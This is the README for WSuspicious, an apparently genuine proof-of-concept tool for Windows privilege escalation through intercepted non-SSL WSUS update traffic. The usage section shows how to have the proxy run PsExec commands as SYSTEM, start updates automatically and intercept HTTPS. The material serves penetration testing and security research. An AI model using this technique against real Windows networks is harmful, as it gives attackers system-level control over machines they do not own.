# WSuspicious

## Summary
This is a proof of concept program to escalate privileges on a Windows host using non-SSL WSUS traffic.
It was inspired from the WSuspect proxy project: https://github.com/ctxis/wsuspect-proxy

## Acknowledgements
Privilege escalation module written by Maxime Nadeau from GoSecure

Huge thanks to:
* Julien Pineault from GoSecure and Mathieu Novis from ‎SecureOps for reviving the WSUS proxy attack
* Romain Carnus from GoSecure for coming up with the HTTPS interception idea
* Paul Stone and Alex Chapman from Context Information Security for writing and researching the original proxy PoC

## Usage
The tool was tested on Windows 10 machines (10.0.17763 and 10.0.18363) in different domain environments.

```
Usage: WSuspicious [OPTION]...
Ex. WSuspicious.exe /command:"" - accepteula - s - d cmd / c """"echo 1 > C:\\wsuspicious.txt"""""" /autoinstall

Creates a local proxy to intercept WSUS requests and try to escalate privileges.
If launched without any arguments, the script will simply create the file C:\\wsuspicious.was.here

/exe                The full path to the executable to run
				    Known payloads are bginfo and PsExec. (Default: .\PsExec64.exe)
/command            The command to execute (Default: -accepteula -s -d cmd /c ""echo 1 > C:\\wsuspicious.was.here"")
/proxyport          The port on which the proxy is started. (Default: 13337)
/downloadport       The port on which the web server hosting the payload is started. (Sometimes useful for older Windows versions)
				    If not specified, the server will try to intercept the request to the legitimate server instead.
/debug              Increase the verbosity of the tool
/autoinstall        Start Windows updates automatically after the proxy is started.
/enabletls          Enable HTTPS interception. WARNING. NOT OPSEC SAFE. 
				    This will prompt the user to add the certificate to the trusted root.
/help               Display this help and exit
```

### Examples
![WSuspicious Privesc Example gif](https://raw.githubusercontent.com/GoSecure/WSuspicious/master/docs/privesc.gif)

## Compilation
The ILMerge dependency can be used to compile the application into a standalone .exe file.
To compile and compile the application, simply use the following command:
```
dotnet msbuild /t:Restore /t:Clean /t:Build /p:Configuration=Release /p:DebugSymbols=false /p:DebugType=None /t:ILMerge /p:TrimUnusedDependencies=true
